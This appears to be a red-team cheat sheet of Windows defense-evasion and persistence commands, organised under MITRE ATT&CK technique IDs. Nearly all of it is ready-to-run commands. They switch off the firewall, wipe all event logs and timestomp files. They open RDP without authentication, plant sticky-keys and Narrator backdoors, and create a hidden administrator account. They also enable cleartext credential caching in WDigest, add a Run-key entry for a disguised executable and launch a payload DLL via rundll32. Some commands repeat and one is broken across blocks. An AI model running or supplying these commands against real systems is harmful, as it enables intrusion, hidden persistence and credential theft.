Impair Defenses =>

Disable or modify system Firewall T1562.004

```cmd
netsh advfirewall set allprofiles state off
```

Impair Command history Logging T1562.003

Indicator Removal =>

Clear Windows Event Logs T1070.001

```powershell
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```


File Deletion T1070.004

Timestopm T1070.006
```powershell
ls .\changetime.txt
Get-ChildItem .\changetime.txt | % { $_.LastWriteTime = "01/01/1970 00:00:00" }
```

Modify Registry T1112


```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d 
```
```powershell
"C:\Windows\system32\sethcs.exe" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v soheilsec /t REG_DWORD /d 0 /f
```
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

```powershell
net user soheilsec P@ssw0rd /ad&net localgroup administrators soheilsec /ad& WMIC USERACCOUNT WHERE Name='soheilsec' SET PasswordExpires=FALSE
```


```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```



```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f
```


```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



```powershell
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4499 /f
```

```powershell
REG ADD HKLM\SOFTWARE\Microsoft\Powershell\1\ShellIDs\Microsoft.Powershell /v executionpolicy /t REG_sz /d bypass /f
```
```powershell
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "microsoft" /t REG_SZ /F /D "c:\windows\IME\IMEKR\DICTS\vshost.exe"
```

```powershell
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f
```
```powershell
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v soheilsec /t REG_DWORD /d 0 /f
```




Obfuscated Files or information =>

Software Packing T1027.002


System Binary Proxy Execution =>

Compiled Html File T1218.001

Rundll32 T1218.011

rundll32.exe payload.dll,0